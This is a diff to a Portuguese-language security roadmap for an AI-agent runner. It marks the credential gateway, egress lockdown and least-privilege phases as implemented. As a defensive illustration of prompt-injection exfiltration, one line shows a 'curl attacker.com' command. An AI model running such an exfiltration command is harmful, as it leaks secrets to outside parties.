@@ -79,7 +79,11 @@ backend**, sem tocar no core.
   Postgres/MySQL por lease com TTL de minutos e revoga automática. Sem broker próprio a
   construir (ver `security-and-secrets.md` §4).
 
-### Fase 1 — Gateway de credenciais (portado do NanoClaw)
+> **Status (implementado):** Fases 1–3 abaixo agora são **código**, não só plano —
+> ver `agenthook/egress/` (broker), `agenthook/github_app.py`, e o hardening in-app
+> em `runner.py`/`server.py`. Deploy end-to-end em [`../deploy/go-live.md`](../deploy/go-live.md).
+
+### Fase 1 — Gateway de credenciais (portado do NanoClaw) ✅
 
 Complementa o Infisical: o Infisical *guarda*; o gateway garante que a chave **nunca
 materializa no env do container**.
@@ -89,7 +93,7 @@ materializa no env do container**.
 - **git/GitHub:** usar **GitHub App installation token** de vida curta (~1h) mintado por
   job, em vez de PAT estático. Fallback: fine-grained PAT escopado a um repo.
 
-### Fase 2 — Egress lockdown (portado do NanoClaw)
+### Fase 2 — Egress lockdown (portado do NanoClaw) ✅
 
 Lacuna confirmada: hoje o container do job **não tem controle de saída** (só há IP
 allowlist de *entrada* no webhook, `auth.py`).
@@ -101,7 +105,7 @@ allowlist de *entrada* no webhook, `auth.py`).
 - **Por quê:** exfiltração é o desfecho de toda injection. Sem egress lock, segredo
   vazado + `curl attacker.com` = fim de jogo, mesmo com Infisical.
 
-### Fase 3 — Least-privilege por instância (usa o que já existe)
+### Fase 3 — Least-privilege por instância (usa o que já existe) ✅
 
 - Default `deliverable=analysis` (read-only forçado) + `mode=plan`. Escrita/PR/DB-write
   só em instâncias explicitamente marcadas **e** com aprovação humana (plan→apply já
